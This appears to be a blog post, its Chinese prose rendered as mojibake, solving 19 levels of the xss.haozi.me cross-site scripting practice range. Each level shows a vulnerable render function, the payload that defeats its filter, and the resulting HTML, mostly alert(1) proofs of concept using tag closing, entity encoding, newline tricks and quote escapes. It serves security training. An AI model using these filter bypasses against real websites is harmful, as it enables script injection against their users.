---
layout: post
title: XSS å°æ¸¸æˆç»ƒä¹ 
categories: [XSS, Webå®‰å…¨, æ¸—é€æµ‹è¯•]
---

## å‰è¨€

ä»Šå¤©åœ¨é—²é€›æ—¶å‘ç°ä¸€ä¸ªé’ˆå¯¹ XSS å…¥é—¨çš„å°é¶åœºï¼Œæƒ³æƒ³è‡ªå·±è¿™ä¸€å¹´æ¥ä¸€ç›´éƒ½åœ¨å­¦ä¹ å¼€å‘æ–¹é¢çš„çŸ¥è¯†ï¼Œå¯¹å®‰å…¨çš„ä¸œè¥¿æœ‰äº›ç”Ÿç–äº†ï¼Œæ­£å¥½å¯ä»¥å½“ä½œå¤ä¹ äº†

é¶åœºä¸€å…±æœ‰ 18 ä¸ªé¢˜ç›®ï¼Œæ¯é“é¢˜åˆ†ä¸º Server Code(æœåŠ¡ç«¯ä»£ç )ã€Input Code(å¯è¾“å…¥ç‚¹)ã€Html(æ˜¾ç¤ºç‚¹)ã€‚åˆ†æ Server Code åœ¨ Input Code å¤„è¾“å…¥æ„é€ çš„ Payloadï¼Œæœ€åç»“æœä¼šæ˜¾ç¤ºåœ¨ Html å¤„ã€‚éƒ½æ˜¯ XSS æœ€åŸºç¡€çš„çŸ¥è¯†ç‚¹ï¼Œéå¸¸é€‚åˆå…¥é—¨å­¦ä¹ ï¼Œå› æ­¤è®°å½•ä¸€ä¸‹

é¶åœºåœ°å€ï¼šhttps://xss.haozi.me

**Tipsï¼šæ­¤é¶åœºåªé€‚åˆäº†è§£ XSSï¼Œå¹¶ä¸å…·å¤‡ä»»ä½•å®æˆ˜æ„ä¹‰**

## 0x00

æœ€åŸºç¡€çš„å¼¹çª—ä»£ç 

Server Code

```js
function render(input) {
  return "<div>" + input + "</div>";
}
```

Input Code

```js
<script>alert(1)</script>
```

HTML

```html
<div>
  <script>
    alert(1);
  </script>
</div>
```

## 0x01

æ ‡ç­¾é—­åˆ

Server Code

```js
function render(input) {
  return "<textarea>" + input + "</textarea>";
}
```

Input Code

```html
</textarea><script>alert(1)</script>
```

HTML

```html
<textarea></textarea><script>alert(1)</script>
  </textarea>
```

## 0x02

å¼•å·å’Œæ ‡ç­¾é—­åˆ

Server Code

```js
function render(input) {
  return '<input type="name" value="' + input + '">';
}
```

Input Code

```js
"><script>alert(1)</script>
```

HTML

```html
<input type="name" value="" />
<script>
  alert(1);
</script>
">
```

## 0x03

æ­£åˆ™æ›¿æ¢äº†å°æ‹¬å·ï¼Œç”¨å®ä½“å­—ç¬¦ç»•è¿‡æˆ–ä½¿ç”¨åå¼•å·ç»•è¿‡ã€‚

å®ä½“å­—ç¬¦ç»•è¿‡æ˜¯ HTML çš„ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼šHTML ä¼šå°†å®ä½“å­—ç¬¦è§£ææˆå¯¹åº”çš„ç¬¦å·ï¼Œå› æ­¤åœ¨ HTML çš„æ ‡ç­¾ä¸­å¯ä»¥é€šè¿‡å®ä½“å­—ç¬¦æ¥ç»•è¿‡ JS ä¸­çš„è¿‡æ»¤ï¼Œä½†æ˜¯ JS ä»£ç ä¸­æ— æ³•è§£æ HTML ç¼–ç ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨

åå¼•å·ç»•è¿‡æ˜¯ JS çš„ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼šJS ä¼šå°†åå¼•å·ä¸­çš„å†…å®¹ä½œä¸ºå¯æ‰§è¡Œä»£ç ï¼ˆå¾ˆå¤šè„šæœ¬è¯­è¨€éƒ½æœ‰è¿™ä¸ªç‰¹æ€§ï¼‰

`<script>`æ ‡ç­¾

Server Code

```js
function render(input) {
  const stripBracketsRe = /[()]/g;
  input = input.replace(stripBracketsRe, "");
  return input;
}
```

Input Code

```html
<!-- HTMLæ ‡ç­¾ä½¿ç”¨å®ä½“å­—ç¬¦ç»•è¿‡ -->
<img src="" onerror="alert&#40;&#49;&#41;" />
<!-- ä½¿ç”¨åå¼•å·ç»•è¿‡ -->
<img src="" onerror="alert`1`" />
```

HTML

```html
<img src="" onerror="alert&#40;&#49;&#41;" /> <img src="" onerror="alert`1`" />
```

## 0x04

æ­£åˆ™æ›¿æ¢äº†å°æ‹¬å·å’Œåå¼•å·ï¼Œä½¿ç”¨ HTML ç¼–ç ç»•è¿‡

Server Code

```js
function render(input) {
  const stripBracketsRe = /[()`]/g;
  input = input.replace(stripBracketsRe, "");
  return input;
}
```

Input Code

```html
<img src="" onerror="alert&#40;&#49;&#41;" />
```

HTML

```html
<img src="" onerror="alert&#40;&#49;&#41;" />
```

## 0x05

ä½¿ç”¨`--!>`é—­åˆæ‰æ³¨é‡Šæ ‡ç­¾ï¼Œæ¢è¡Œåªæ˜¯ä¸ªäººä¹ æƒ¯

Server Code

```js
function render(input) {
  input = input.replace(/-->/g, "ğŸ˜‚");
  return "<!-- " + input + " -->";
}
```

Input Code

```html
--!> <img src="" onerror="alert&#40;&#49;&#41;" />
```

HTML

```html
<!-- --!>
  <img src="" onerror=alert&#40;&#49;&#41;>
 -->
```

## 0x06

åˆ©ç”¨æ­£åˆ™ä¸åŒ¹é…æ¢è¡Œç¬¦çš„ç‰¹æ€§ï¼Œä½¿ç”¨æ¢è¡Œç»•è¿‡

Server Code

```js
function render(input) {
  input = input.replace(/auto|on.*=|>/gi, "_");
  return `<input value=1 ${input} type="text">`;
}
```

Input Code

```html
onclick =alert(1)
```

HTML

```html
<input value="1" onclick="alert(1)" type="text" />
```

## 0x07

åˆ©ç”¨ HTML æ ‡ç­¾ä¸é—­åˆä¹Ÿèƒ½è§£æçš„å®¹é”™æœºåˆ¶ï¼Œé—­åˆæ‰å‰é¢çš„æ ‡ç­¾

Server Code

```js
function render(input) {
  const stripTagsRe = /<\/?[^>]+>/gi;

  input = input.replace(stripTagsRe, "");
  return `<article>${input}</article>`;
}
```

Input Code

```js
< /article
<img src="" onerror=alert(1)
<!--
```

HTML

```html
<article>< /article
<img src="" onerror=alert(1)
<!--</article>
```

## 0x08

åˆ©ç”¨ HTML å®¹é”™æœºåˆ¶ç»•è¿‡æ­£åˆ™æ›¿æ¢

Server Code

```js
function render(src) {
  src = src.replace(/<\/style>/gi, "/* \u574F\u4EBA */");
  return `
    <style>
      ${src}
    </style>
  `;
}
```

Input Code

```js
</style >
<img src="" onerror="alert(1)"
```

HTML

```html
<style>
      </style >
<img src="" onerror="alert(1)"
    </style>
```

## 0x09

åŒ¹é…æŒ‡å®šçš„ URL åé—­åˆåŒå¼•å·å’Œæ ‡ç­¾

Server Code

```js
function render(input) {
  let domainRe = /^https?:\/\/www\.segmentfault\.com/;
  if (domainRe.test(input)) {
    return `<script src="${input}"></script>`;
  }
  return "Invalid URL";
}
```

Input Code

```js
https://www.segmentfault.com/"></script><img src="" onerror="alert(1)"><!--
```

HTML

```html
<script src="https://www.segmentfault.com/"></script><img src="" onerror="alert(1)"><!-- "></script>
```

## 0x0A

æ­¤é¢˜æ˜¯å°†å¯èƒ½çš„ç¬¦å·éƒ½åšäº†è½¬ä¹‰ä¸ºå®ä½“ç¬¦å·ï¼Œå¹¶ä¸”éœ€è¦åŒ¹é…æŒ‡å®šçš„ URLï¼Œé¢˜è§£ç»™å‡ºçš„è§£æ³•æ˜¯è®¿é—®æ­¤ç½‘ç«™æ ¹ç›®å½•ä¸‹çš„`j.js`æ–‡ä»¶ï¼Œä½†å®é™…ä½¿ç”¨æ—¶ä¸ç”Ÿæ•ˆï¼ŒæŸ¥çœ‹äº†ä¸€äº›å…¶ä»–äººçš„åšå®¢ä¹Ÿæ˜¯åŒæ ·ä¸ç”Ÿæ•ˆï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆ

å…¶åˆ©ç”¨çš„çŸ¥è¯†ç‚¹å…¶å®æ˜¯ URL è®¿é—®ä¸­å¦‚æœå­˜åœ¨`@`ç¬¦å·ï¼Œåˆ™ä¼šè®¿é—®åˆ°æœ€åé¢çš„é‚£ä¸ª URL åœ°å€

Server Code

```js
function render(input) {
  function escapeHtml(s) {
    return s
      .replace(/&/g, "&amp;")
      .replace(/'/g, "&#39;")
      .replace(/"/g, "&quot;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/\//g, "&#x2f");
  }

  const domainRe = /^https?:\/\/www\.segmentfault\.com/;
  if (domainRe.test(input)) {
    return `<script src="${escapeHtml(input)}"></script>`;
  }
  return "Invalid URL";
}
```

Input Code

```js
https://www.segmentfault.com@xss.haozi.me/j.js
```

HTML

```html
<script src="https:&#x2f&#x2fwww.segmentfault.com@xss.haozi.me&#x2fj.js"></script>
```

## 0x0B

çŸ¥è¯†ç‚¹ï¼šHTML å¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼ŒJS å¯¹å¤§å°å†™æ•æ„Ÿ

æ‰€ä»¥å°† JS ä»£ç è¿›è¡Œ HTML ç¼–ç ï¼ŒåµŒå…¥åˆ° HTML æ ‡ç­¾ä¸­å°±å¯ä»¥ç»•è¿‡å¤§å†™è½¬æ¢å‡½æ•°

Server Code

```js
function render(input) {
  input = input.toUpperCase();
  return `<h1>${input}</h1>`;
}
```

Input Code

```js
</h1>
<img src="" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
<H1>
```

HTML

```html
<h1></h1>
<img src="" ONERROR="&#X61;&#X6C;&#X65;&#X72;&#X74;&#X28;&#X31;&#X29;" />
<h1></h1>
```

## 0x0C

å’Œä¸Šä¸€é¢˜ä¸€æ ·ï¼Œä¸è¿‡æ˜¯æ›¿æ¢äº† script å…³é”®å­—ï¼Œä½¿ç”¨ HTML æ ‡ç­¾å°±è¡Œäº†

Server Code

```js
function render(input) {
  input = input.replace(/script/gi, "");
  input = input.toUpperCase();
  return "<h1>" + input + "</h1>";
}
```

Input Code

```js
</h1>
<img src="" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
<H1>
```

HTML

```html
<h1></h1>
<img src="" ONERROR="&#X61;&#X6C;&#X65;&#X72;&#X74;&#X28;&#X31;&#X29;" />
<h1></h1>
```

## 0x0D

1. åœ¨ html çš„ script æ ‡ç­¾ä¸­`<!--`å’Œ`-->`å¯ä»¥åˆ†å¼€å•ç‹¬ä½¿ç”¨ï¼Œéƒ½èƒ½ä½œä¸ºå•è¡Œæ³¨é‡Šã€‚å› ä¸ºè¿‡æ»¤äº†`<`æ‰€ä»¥ä½¿ç”¨`-->`ä½œä¸ºå•è¡Œæ³¨é‡Š

2. æ¢è¡Œç»•è¿‡å•è¡Œæ³¨é‡Š

Server Code

```js
function render(input) {
  input = input.replace(/[</"']/g, "");
  return `
    <script>
          // alert('${input}')
    </script>
  `;
}
```

Input Code

```js

alert(1)
-->
```

HTML

```html
<script>
  // alert('
  alert(1);
  -->')
</script>
```

## 0x0E

å¤è‹±æ–‡ä¸­`Å¿`ç­‰äºç°åœ¨çš„`s`ï¼Œç»•è¿‡ scriptã€‚JS å¤§å°å†™æ•æ„Ÿï¼ŒHTML å¤§å°å†™ä¸æ•æ„Ÿï¼Œæ‰€ä»¥é€šè¿‡å¼•ç”¨å¤–éƒ¨é“¾æ¥çš„æ–¹å¼ï¼Œå¼•ç”¨å…¶ä»– js æ–‡ä»¶

Server Code

```js
function render(input) {
  input = input.replace(/<([a-zA-Z])/g, "<_$1");
  input = input.toUpperCase();
  return "<h1>" + input + "</h1>";
}
```

Input Code

```js
<Å¿cript src="https://xss.haozi.me/j.js"></script>
```

HTML

```html
<h1><script src="HTTPS://XSS.HAOZI.ME/J.JS"></script></h1>
```

## 0x0F

ä»–è¿™é‡Œå¯¹ html æ ‡ç­¾çš„è¡Œå†…å­—ç¬¦è¿›è¡Œè½¬ä¹‰å¹¶æ²¡æœ‰ä»»ä½•ä½œç”¨ï¼Œå› ä¸ºæµè§ˆå™¨ä¼šå…ˆè§£æ html å†è§£æ jsï¼Œæ‰€ä»¥å®ƒè½¬ä¹‰åçš„å®ä½“å­—ç¬¦è¿˜æ˜¯ä¼šå…ˆè¢«è§£æã€‚æ‰€ä»¥ç›´æ¥é—­åˆå°±è¡Œäº†

Server Code

```js
function render(input) {
  function escapeHtml(s) {
    return s
      .replace(/&/g, "&amp;")
      .replace(/'/g, "&#39;")
      .replace(/"/g, "&quot;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/\//g, "&#x2f;");
  }
  return `<img src onerror="console.error('${escapeHtml(input)}')">`;
}
```

Input Code

```js
');alert('1
```

HTML

```html
<img src onerror="console.error('&#39;);alert(&#39;1')" />
```

## 0x10

JS é—­åˆå’Œè¯­å¥ç»“æŸç¬¦

Server Code

```js
function render(input) {
  return `
<script>
  window.data = ${input}
</script>
  `;
}
```

Input Code

```js
"";
alert(1);
```

HTML

```html
<script>
  window.data = "";
  alert(1);
</script>
```

## 0x11

è™½ç„¶åšäº†è½¬ä¹‰ï¼Œä½†è½¬ä¹‰åè¿˜æ˜¯é€ æˆäº†åŒå¼•å·çš„é—­åˆ

Server Code

```js
// from alf.nu
function render(s) {
  function escapeJs(s) {
    return (
      String(s)
        .replace(/\\/g, "\\\\")
        .replace(/'/g, "\\'")
        .replace(/"/g, '\\"')
        .replace(/`/g, "\\`")
        .replace(/</g, "\\74")
        .replace(/>/g, "\\76")
        .replace(/\//g, "\\/")
        .replace(/\n/g, "\\n")
        .replace(/\r/g, "\\r")
        .replace(/\t/g, "\\t")
        .replace(/\f/g, "\\f")
        .replace(/\v/g, "\\v")
        // .replace(/\b/g, '\\b')
        .replace(/\0/g, "\\0")
    );
  }
  s = escapeJs(s);
  return `
<script>
  var url = 'javascript:console.log("${s}")'
  var a = document.createElement('a')
  a.href = url
  document.body.appendChild(a)
  a.click()
</script>
`;
}
```

Input Code

```js
");alert("1
```

HTML

```html
<script>
  var url = 'javascript:console.log("");alert("1")';
  var a = document.createElement("a");
  a.href = url;
  document.body.appendChild(a);
  a.click();
</script>
```

## 0x12

å°†åŒå¼•å·è½¬ä¹‰ååˆä½¿ç”¨å•å¼•å·åŒ…è£¹ï¼Œå› æ­¤å†åŠ ä¸€ä¸ªè½¬ä¹‰ç¬¦ï¼Œå°†åŒå¼•å·è½¬ä¹‰åçš„è½¬ä¹‰ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œå°±å®ç°äº†åŒå¼•å·çš„é—­åˆã€‚æœ€åé¢çš„å°±ç›´æ¥æ³¨é‡Šæ‰äº†

Server Code

```js
// from alf.nu
function escape(s) {
  s = s.replace(/"/g, '\\"');
  return '<script>console.log("' + s + '");</script>';
}
```

Input Code

```js
\");alert(1) //
```

HTML

```html
<script>
  console.log("\\");
  alert(1); //");
</script>
```
